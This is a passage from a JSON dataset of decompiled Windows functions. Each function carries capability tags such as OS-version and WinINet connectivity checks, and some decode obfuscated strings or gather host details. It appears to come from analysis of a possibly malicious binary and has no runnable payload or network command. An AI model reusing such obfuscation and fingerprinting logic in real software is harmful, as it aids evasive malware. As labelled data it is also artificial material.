        "decompiled_code": "\nuint __cdecl fcn.004057ad(uint *arg_8h, uint32_t arg_ch)\n\n{\n    uint *in_EAX;\n    uint *puVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if (in_ECX == NULL) {\n        uVar4 = 9;\n    }\n    else if (arg_8h == NULL) {\n        uVar4 = 0xf;\n    }\n    else if (arg_ch < 0x100) {\n        puVar1 = in_EAX;\n        if ((in_EAX == NULL) && (puVar1 = fcn.00406c7f(),  puVar1 == NULL)) {\n            uVar4 = 0x12;\n        }\n        else {\n            puVar3 = puVar1;\n            for (iVar2 = 0xb2; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = *in_ECX;\n                in_ECX = in_ECX + 1;\n                puVar3 = puVar3 + 1;\n            }\n            fcn.00405012();\n            puVar3 = puVar1 + arg_ch * 0x20 + 0x92;\n            for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *arg_8h = *puVar3;\n                puVar3 = puVar3 + 1;\n                arg_8h = arg_8h + 1;\n            }\n            if (in_EAX == NULL) {\n                sub.ntdll.dll_memset(puVar1, 0, arg_ch * 0x80 + 0x2c8);\n                fcn.00406d25();\n            }\n            uVar4 = 0;\n        }\n    }\n    else {\n        uVar4 = 0x11;\n    }\n    return uVar4;\n}\n",
        "token_count": 440
    },
    "00405c85": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405c85(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    int32_t iVar4;\n    uint uVar5;\n    uint s;\n    uint var_4h;\n    \n    if (unaff_ESI == NULL) {\n        iVar4 = 3;\n    }\n    else if (unaff_ESI[0x43] == 0) {\n        iVar4 = 5;\n    }\n    else if (unaff_EBX < 0) {\n        iVar4 = 6;\n    }\n    else if (unaff_EBX < 0x1c) {\n        puVar1 = unaff_ESI + 0x46;\n        uVar2 = *puVar1;\n        *puVar1 = *puVar1 + 1;\n        unaff_ESI[0x47] = unaff_ESI[0x47] + (0xfffffffe < uVar2);\n        if (unaff_EBX == 1) {\n            if (unaff_ESI[0x5b] + 1 < 2) {\n                uVar5 = 0x30;\n                puVar3 = unaff_ESI + 0xfe;\n            }\n            else {\n                uVar5 = 0x40;\n                puVar3 = unaff_ESI + 0xde;\n            }\n            fcn.00405acb(puVar3, uVar5);\n        }\n        puVar1 = unaff_ESI + unaff_EBX * 2 + 0xefc;\n        iVar4 = fcn.0040591e(arg_8h, unaff_ESI + 0x4a, unaff_EBX, *puVar1, arg_ch, 0x1000 - unaff_ESI[unaff_EBX + 0xede]\n                             , unaff_ESI[0x5a], *unaff_ESI, unaff_ESI + unaff_EBX * 0x80 + 0x5e);\n        if (iVar4 == 0) {\n            unaff_ESI[unaff_EBX + 0xede] = 0;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 + 1;\n            puVar1[1] = puVar1[1] + (0xfffffffe < uVar2);\n            sub.ntdll.dll_memset(unaff_ESI + unaff_EBX * 0x80 + 0x5e, 0, 0x200);\n            iVar4 = 0;\n        }\n    }\n    else {\n        iVar4 = 7;\n    }\n    return iVar4;\n}\n",
        "token_count": 616
    },
    "00405d6a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405d6a(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint var_84h;\n    \n    iVar5 = 0;\n    if (arg_8h == 0) {\n        return 3;\n    }\n    if (*(arg_8h + 0x10c) == 0) {\n        return 5;\n    }\n    if (arg_10h == 0) {\n        if (*(arg_8h + 0x3b78 + arg_ch * 4) < 0x1000) {\n            return 0;\n        }\n    }\n    else if (arg_ch == *(arg_8h + 0x174)) {\n        if (arg_ch == *(arg_8h + 0x16c) + 1) {\n            if (*(arg_8h + 0x3b78 + arg_ch * 4) == 0x400) {\n                if (*(arg_8h + 0x3bf4 + arg_ch * 8) != 0) {\n                    return 0;\n                }\n                if (*(arg_8h + 0x3bf0 + arg_ch * 8) != 0) {\n                    return 0;\n                }\n            }\n        }\n        else if ((1 < arg_ch) && (*(arg_8h + 0x3b78 + arg_ch * 4) == 0x400)) {\n            return 0;\n        }\n    }\n    if ((arg_10h != 0) && (arg_ch == *(arg_8h + 0x174))) {\n        iVar5 = 1;\n    }\n    iVar3 = fcn.00405c85(&var_84h, iVar5);\n    if (iVar3 == 0) {\n        if (iVar5 == 1) {\n            puVar4 = &var_84h;\n            puVar6 = arg_8h + 8;\n            for (iVar5 = 0x20; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            return 0;\n        }\n        iVar3 = *(arg_8h + 0x16c) + 1;\n        iVar5 = arg_ch + 1;\n        if (iVar3 <= arg_ch + 1) {\n            iVar5 = iVar3;\n        }\n        if (((iVar5 == iVar3) && ((*(arg_8h + 0x3bf0 + iVar5 * 8) | *(arg_8h + 0x3bf4 + iVar5 * 8)) == 0)) &&\n           (piVar1 = arg_8h + 0x3b78 + iVar5 * 4,  *piVar1 == 0)) {\n            *piVar1 = 0x400;\n        }\n        puVar2 = arg_8h + 0x3b78 + iVar5 * 4;\n        puVar4 = &var_84h;\n        puVar6 = iVar5 * 0x200 + 0x178 + (*puVar2 >> 3) + arg_8h;\n        for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        *puVar2 = *puVar2 + 0x400;\n        if (*(arg_8h + 0x174) < iVar5) {\n            *(arg_8h + 0x174) = iVar5;\n        }\n        iVar5 = fcn.00405d6a(arg_8h, iVar5, arg_10h);\n        return iVar5;\n    }\n    return iVar3;\n}\n",
        "token_count": 924
    },
    "0040613e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040613e(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    if (in_EAX == NULL) {\n        iVar2 = 3;\n    }\n    else if (in_EAX[0x43] == 0) {\n        iVar2 = 5;\n    }\n    else {\n        if (in_EAX[0x48] != 1) {\n            iVar2 = 1;\n            if ((in_EAX[0x5d] != 1) && (iVar2 = 1,  0 < in_EAX[0x5d])) {\n                piVar1 = in_EAX + 0xedf;\n                iVar2 = 1;\n                do {\n                    if (*piVar1 != 0) break;\n                    iVar2 = iVar2 + 1;\n                    piVar1 = piVar1 + 1;\n                } while (iVar2 <= in_EAX[0x5d]);\n            }\n            iVar2 = fcn.00405d6a(in_EAX, iVar2, 1);\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            fcn.00405acb(in_EAX + 2, 0x10);\n            fcn.00406079();\n            if (param_1 != 0) {\n                sub.ntdll.dll_memcpy(param_1, in_EAX + 2, *in_EAX + 7 + (*in_EAX + 7 >> 0x1f & 7U) >> 3);\n            }\n            fcn.00405fd8();\n            in_EAX[0x48] = 1;\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 395
    },
    "00406459": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406459(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_2b0h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    var_8h = fcn.0040384a();\n    var_4h = 0;\n    var_10h = 0;\n    do {\n        if (4 < var_10h) break;\n        fcn.00403b8f(arg_ch);\n        fcn.00403b40(in_EAX + -1);\n        fcn.00403b40(in_EAX + -2);\n        fcn.00403b40(0);\n        uVar5 = 0;\n        do {\n            uVar3 = fcn.00403b20(var_8h, *(uVar5 + 0x413ba8));\n            *(&var_2b0h + uVar5) = uVar3;\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x29c);\n        iVar4 = 0;\n        var_4h = 0;\n        var_ch = 0;\n        if (in_EAX * 100 != 0) {\n            do {\n                uVar5 = 0;\n                if (iVar4 != 0) break;\n                var_14h = var_14h + 1;\n                if (var_ch != 0) {\n                    do {\n                        puVar2 = &var_2b0h + uVar5;\n                        puVar1 = uVar5 + 0x413ba8;\n                        uVar5 = uVar5 + 4;\n                        *puVar2 = (*puVar2 + 2) % *puVar1;\n                    } while (uVar5 < 0x29c);\n                }\n                uVar5 = 0;\n                do {\n                    if ((&var_2b0h)[uVar5] == 0) goto code_r0x00406560;\n                    uVar5 = uVar5 + 1;\n                } while (uVar5 < 0xa7);\n                fcn.00403b20(var_8h, 0x10001);\n                iVar4 = fcn.004039d8();\n                if ((iVar4 != 0) && (iVar4 = fcn.00403b80(),  iVar4 != 0)) {\n                    var_4h = 1;\n                    break;\n                }\ncode_r0x00406560:\n                var_ch = var_ch + 1;\n                iVar4 = fcn.00403a06(arg_8h);\n            } while (var_ch < in_EAX * 100);\n        }\n        var_10h = var_10h + 1;\n    } while (var_4h == 0);\n    fcn.00403871();\n    if (var_4h == 0) {\n        return -1;\n    }\n    return var_14h;\n}\n",
        "token_count": 732
    },
    "00406949": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406949(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    cVar1 = *param_1;\n    pcVar2 = param_1;\n    while (cVar1 != '\\0') {\n        pcVar2 = pcVar2 + 1;\n        cVar1 = *pcVar2;\n    }\n    return pcVar2 - param_1;\n}\n",
        "token_count": 98
    },
    "0040763a": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Switch with 1 destination removed at 0x004076c3 : 10 cases all go to same destination\n\nint32_t __fastcall fcn.0040763a(char *param_1, int32_t param_2)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint arg_8h;\n    uint *puVar2;\n    int32_t iStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint8_t uStack24;\n    \n    if (((in_EAX == NULL) || (param_1 == NULL)) || (*param_1 == '\\0')) {\n        iStack32 = 0;\n    }\n    else {\n        iStack32 = 0;\n        if (*in_EAX != '\\0') {\n            puVar2 = param_2 + -4;\n            do {\n                iVar1 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX);\n                if (iVar1 != 0) {\n                    while ((*param_1 != '\\0' && (iVar1 = (*_sym.imp.ntdll.dll_isspace)(*param_1),  iVar1 != 0))) {\n                        param_1 = param_1 + 1;\n                    }\n                    in_EAX = in_EAX + 1;\n                }\n                if (*in_EAX == '%') {\n                    iVar1 = fcn.00406f3e(in_EAX + 1);\n                    in_EAX = in_EAX + 1 + iVar1;\n                    arg_8h = 0;\n                    if (((uStack24 & 0x40) == 0) && (iStack28 - 1U < 10)) {\n    // switch table (10 cases) at 0x40771a\n                        puVar2 = puVar2 + 1;\n                        arg_8h = *puVar2;\n                    }\n                    iStack36 = 0;\n                    iVar1 = fcn.00407122(arg_8h, &iStack36);\n                    if (iStack36 == 0) {\n                        return iStack32;\n                    }\n                    iStack32 = iStack32 + iStack36;\n                    param_1 = param_1 + iVar1;\n                }\n                else {\n                    if (*in_EAX != *param_1) {\n                        return iStack32;\n                    }\n                    in_EAX = in_EAX + 1;\n                    param_1 = param_1 + 1;\n                }\n            } while (*in_EAX != '\\0');\n        }\n    }\n    return iStack32;\n}\n",
        "token_count": 552
    },
    "00407742": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407742(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    if (in_EAX == 0) {\n        in_EAX = (**0x4133a4)(arg_8h);\n    }\n    uVar1 = (**0x4134f4)(0x4e3, 0x200, arg_8h, in_EAX);\n    if (arg_ch != 0) {\n        if (arg_ch < uVar1) {\n            uVar1 = 0;\n        }\n        *(uVar1 + unaff_ESI) = 0;\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00407781": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407781(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    if (in_EAX == 0) {\n        in_EAX = (**0x4133a8)(arg_ch);\n    }\n    uVar1 = (**0x4134ec)(arg_8h, 0, arg_ch, in_EAX);\n    if (arg_10h != 0) {\n        if (arg_10h < uVar1) {\n            uVar1 = 0;\n        }\n        *(unaff_ESI + uVar1 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 170
    },
    "00407b30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407b30(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t var_4h;\n    \n    cVar2 = fcn.00408e75(arg_8h);\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    var_4h = 0;\n    fcn.00407b05();\n    iVar3 = fcn.0040fdc1(arg_ch);\n    fcn.0040377b();\n    piVar4 = *0x4342b8;\n    if (*0x4342b8 == NULL) {\ncode_r0x00407b85:\n        piVar4 = fcn.00406c76();\n        piVar5 = *0x4342b8;\n        if (piVar4 == NULL) goto code_r0x00407c0b;\n        *piVar4 = iVar3;\n        piVar1 = piVar4;\n        if (piVar5 != NULL) {\n            for (; piVar5[4] != NULL; piVar5 = piVar5[4]) {\n            }\n            piVar5[4] = piVar4;\n            piVar1 = *0x4342b8;\n        }\n        *0x4342b8 = piVar1;\n        iVar3 = fcn.00406c7f();\n        piVar4[2] = iVar3;\n        if (iVar3 != 0) {\n            fcn.00406390(&arg_10h, 4, arg_8h, arg_ch);\n            *(arg_ch + piVar4[2]) = 0;\n        }\n    }\n    else {\n        do {\n            if (*piVar4 == iVar3) break;\n            piVar4 = piVar4[4];\n        } while (piVar4 != NULL);\n        if (piVar4 == NULL) goto code_r0x00407b85;\n    }\n    if (arg_14h == '\\0') {\n        var_4h = piVar4[2];\n    }\n    else {\n        if (piVar4[3] == 0) {\n            iVar3 = fcn.004078ea(piVar4[2], 0);\n            piVar4[3] = iVar3;\n        }\n        var_4h = piVar4[3];\n    }\ncode_r0x00407c0b:\n    fcn.00403780();\n    return var_4h;\n}\n",
        "token_count": 590
    },
    "00408177": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00408177(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t unaff_EBX;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if ((arg_8h != '\\0') && (1 < unaff_EBX)) {\n        cVar1 = fcn.00408e22();\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00408048(arg_8h, &var_4h);\n            if (iVar2 != 0) {\n                if (unaff_EBX != 1) {\n                    do {\n                        iVar3 = fcn.004095c4();\n                        *(in_EAX + uVar4 * 2) = *(iVar2 + iVar3 * 2);\n                        uVar4 = uVar4 + 1;\n                    } while (uVar4 < unaff_EBX - 1);\n                }\n                *(in_EAX + -2 + unaff_EBX * 2) = 0;\n                fcn.00406d25();\n                uVar4 = 1;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 288
    },
    "0040959f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040959f(void)\n\n{\n    int16_t *in_EAX;\n    \n    if (((in_EAX != NULL) && (*in_EAX == 0x2e)) && ((in_EAX[1] == 0 || ((in_EAX[1] == 0x2e && (in_EAX[2] == 0)))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 95
    },
    "00409c71": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00409c71(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h;\n    uint uVar3;\n    int32_t arg_ch;\n    uint var_68h;\n    char var_64h;\n    char var_63h;\n    char var_62h;\n    char var_61h;\n    char var_60h;\n    char var_5fh;\n    char var_5eh;\n    char var_5dh;\n    char var_5ch;\n    char var_5bh;\n    char var_5ah;\n    char var_59h;\n    char var_58h;\n    char var_57h;\n    char var_56h;\n    uint var_55h;\n    \n    if (*0x4344c4 == 0) {\n        puVar1 = fcn.00401f6e();\n        uVar2 = fcn.00409be5();\n        arg_10h = *puVar1;\n        uVar3 = fcn.00407c1d(0x412228, 0x20, 0xb8db721e, arg_10h, puVar1[1], puVar1[2], puVar1[3], puVar1[4], puVar1[5]\n                             , *0x413a54, (uVar2 & 0xffff) >> 4);\n        fcn.00407db3(&var_68h, uVar3, arg_10h);\n        arg_ch = var_68h;\n        uVar3 = fcn.00407c1d(0x41224c, 0x2c, 0xfee8c1cc, arg_ch, var_68h._1_1_, var_68h._2_1_, var_68h._3_1_, var_64h, \n                             var_63h, var_62h, var_61h, var_60h, var_5fh, var_5eh, var_5dh, var_5ch, var_5bh, var_5ah, \n                             var_59h, var_58h, var_57h, var_56h, var_55h);\n        fcn.00407e4e(uVar3, arg_ch);\n    }\n    return *0x4344c4;\n}\n",
        "token_count": 534
    },
    "0040a764": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040a764(uint param_1, uint param_2, char param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    if (*0x43359b != '\\0') {\n        if (param_3 == '\\0') {\n            uVar3 = 0x2abaa7f5;\n            uVar2 = 0xb;\n            uVar1 = 0x412350;\n        }\n        else {\n            uVar3 = 0xe7d5745b;\n            uVar2 = 10;\n            uVar1 = 0x412344;\n        }\n        uVar1 = fcn.00407c1d(uVar1, uVar2, uVar3, param_1);\n        fcn.0040a437(param_2, uVar1);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0040a9dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.0040a9dc(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uchar *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint extraout_ECX;\n    uint32_t uVar9;\n    uint32_t arg_10h;\n    int32_t iVar10;\n    ulong uVar11;\n    uint var_f0h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    int32_t var_68h;\n    int32_t iStack103;\n    uchar uStack99;\n    int32_t var_5ch;\n    int32_t iStack91;\n    uchar uStack87;\n    int32_t var_50h;\n    int32_t iStack79;\n    uchar uStack75;\n    int32_t var_44h;\n    int32_t iStack67;\n    uchar uStack63;\n    int32_t var_38h;\n    int32_t iStack55;\n    uchar uStack51;\n    uint var_2ch;\n    uint uStack43;\n    uchar uStack39;\n    int32_t var_20h;\n    int32_t iStack31;\n    uchar uStack27;\n    uchar *var_14h;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    iVar2 = (**0x4133a8)();\n    var_10h = iVar2;\n    var_8h = iVar2;\n    var_14h = fcn.00406c76();\n    var_ch = var_14h;\njoined_r0x0040aa06:\n    while( true ) {\n        while( true ) {\n            if (iVar2 == 0) {\n                if (arg_8h != NULL) {\n                    *arg_8h = var_10h;\n                }\n                return var_14h;\n            }\n            uVar3 = fcn.00407c1d(0x412364, 10, 0x51f85f66, 10);\n            iVar2 = (**0x413164)(in_EAX, uVar3);\n            if (iVar2 != 0) break;\n            var_44h._0_1_ = 0;\n            uStack63 = 0;\n            uVar6 = *0x4335a2 != '\\0';\n            unique0x1000094a = iVar2;\n            iStack67 = iVar2;\n            uVar3 = fcn.00407c1d(0x412370, 2, 0xa32742c6);\n            fcn.00407db3(&var_44h, uVar3, uVar6);\n            fcn.0040a8b2(&var_14h, &var_44h, 10);\n            in_EAX = in_EAX + 10;\n            var_8h = var_8h + -10;\n            iVar2 = var_8h;\n        }\n        uVar3 = fcn.00407c1d(0x412374, 8, 0x4b93ebb6, 8);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 != 0) break;\n        var_5ch._0_1_ = 0;\n        uStack87 = 0;\n        unique0x1000093a = iVar2;\n        iStack91 = iVar2;\n        iVar2 = fcn.00409029();\n        uVar6 = iVar2 != 0;\n        uVar3 = fcn.00407c1d(0x412370, 2, 0xa32742c6);\n        fcn.00407db3(&var_5ch, uVar3, uVar6);\n        puVar8 = &var_5ch;\ncode_r0x0040af35:\n        fcn.0040a8b2(&var_14h, puVar8, 8);\n        in_EAX = in_EAX + 8;\n        var_8h = var_8h + -8;\n        iVar2 = var_8h;\n    }\n    uVar3 = fcn.00407c1d(0x412380, 0xc, 0x221d3d33, 0xc);\n    iVar2 = (**0x413164)(in_EAX, uVar3);\n    if (iVar2 == 0) {\n        var_20h._0_1_ = 0;\n        uStack27 = 0;\n        uVar3 = *0x413a54;\n        unique0x1000095a = iVar2;\n        iStack31 = iVar2;\n        uVar4 = fcn.00407c1d(0x412390, 4, 0xfe2dc38e);\n        fcn.00407db3(&var_20h, uVar4, uVar3);\n        fcn.0040a8b2(&var_14h, &var_20h, 0xc);\n        in_EAX = in_EAX + 0xc;\n        var_8h = var_8h + -0xc;\n        iVar2 = var_8h;\n        goto joined_r0x0040aa06;\n    }\n    uVar3 = fcn.00407c1d(0x412398, 4, 0x6659402b, 4);\n    iVar2 = (**0x413164)(in_EAX, uVar3);\n    if (iVar2 == 0) {\n        var_68h._0_1_ = 0;\n        uStack99 = 0;\n        unique0x10000932 = iVar2;\n        iStack103 = iVar2;\n        uVar3 = fcn.0040a7a5();\n        uVar4 = fcn.00407c1d(0x4123a0, 2, 0x5f2dc2a9);\n        fcn.00407db3(&var_68h, uVar4, uVar3);\n        fcn.0040a8b2(&var_14h, &var_68h, 4);\n        in_EAX = in_EAX + 4;\n        var_8h = var_8h + -4;\n        iVar2 = var_8h;\n        goto joined_r0x0040aa06;\n    }\n    iVar10 = 7;\n    uVar3 = fcn.00407c1d(0x4123a4, 7, 0xa5387f80, 7);\n    iVar2 = (**0x413164)(in_EAX, uVar3);\n    if (iVar2 == 0) {\n        iVar2 = 7;\n        uVar3 = fcn.00409c71(extraout_ECX);\n    }\n    else {\n        iVar10 = 0xd;\n        uVar3 = fcn.00407c1d(0x4123ac, 0xd, 0x95d012d9, 0xd);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 == 0) {\n            iVar2 = 0xd;\n            uVar3 = fcn.0040b19f();\n            goto code_r0x0040af7f;\n        }\n        iVar10 = 9;\n        uVar3 = fcn.00407c1d(0x4123bc, 9, 0xf53de813, 9);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 == 0) {\n            puVar5 = fcn.00401f6e();\n            uVar6 = *puVar5;\n            uVar3 = fcn.00407c1d(0x4123c8, 0x18, 0x9c7de4a3, uVar6, puVar5[1], puVar5[2], puVar5[3], puVar5[4], \n                                 puVar5[5]);\n            fcn.00407db3(&var_d4h, uVar3, uVar6);\n            fcn.0040a8b2(&var_14h, &var_d4h, 9);\n            goto code_r0x0040af91;\n        }\n        uVar3 = fcn.00407c1d(0x4123e4, 0xd, 0x3baf41cf, 0xd);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 == 0) {\n            var_e0h = 0x14;\n            var_dch = 0x14;\n            var_d8h = 0x28;\n            var_d4h = 0x28;\n            var_d0h = 0x3c;\n            var_cch = 0x3c;\n            var_c8h = 0x50;\n            var_c4h = 0x50;\n            var_c0h = 100;\n            var_bch = 100;\n            var_b8h = 0x96;\n            var_b0h = 200;\n            var_ach = 200;\n            var_a8h = 0xfa;\n            var_a4h = 0xfa;\n            var_a0h = 300;\n            var_9ch = 300;\n            var_98h = 0x15e;\n            var_94h = 0x15e;\n            var_90h = 400;\n            var_8ch = 400;\n            var_80h = 0x2ee;\n            var_7ch = 0x2ee;\n            var_e4h = 0;\n            var_88h = 0x1c2;\n            var_84h = 500;\n            var_78h = 1000;\n            var_74h = 999;\n            var_70h = 0;\n            var_b4h = var_b8h;\n            uVar11 = fcn.0040fb38();\n            uVar6 = sub.ntdll.dll__alldiv(uVar11, 0x40000000, 0);\n            uVar9 = 0;\n            do {\n                if (((&var_e4h)[uVar9 * 2] <= uVar6) && (arg_10h = uVar9,  uVar6 < (&var_e0h)[uVar9 * 2])) break;\n                uVar9 = uVar9 + 1;\n                arg_10h = 0;\n            } while (uVar9 < 0xf);\n            var_2ch._0_1_ = 0;\n            stack0xffffffd1 = 0;\n            uStack43 = 0;\n            uStack39 = 0;\n            uVar3 = fcn.00407c1d(0x4123a0, 2, 0x5f2dc2a9);\n            fcn.00407db3(&var_2ch, uVar3, arg_10h);\n            fcn.0040a8b2(&var_14h, &var_2ch, 0xd);\n            in_EAX = in_EAX + 0xd;\n            var_8h = var_8h + -0xd;\n            iVar2 = var_8h;\n            goto joined_r0x0040aa06;\n        }\n        iVar10 = 6;\n        uVar3 = fcn.00407c1d(0x4123f4, 6, 0x27691f8b, 6);\n        iVar2 = (**0x413164)(in_EAX, uVar3);\n        if (iVar2 == 0) {\n            uVar6 = (**0x413168)(in_EAX + 6);\n            iVar10 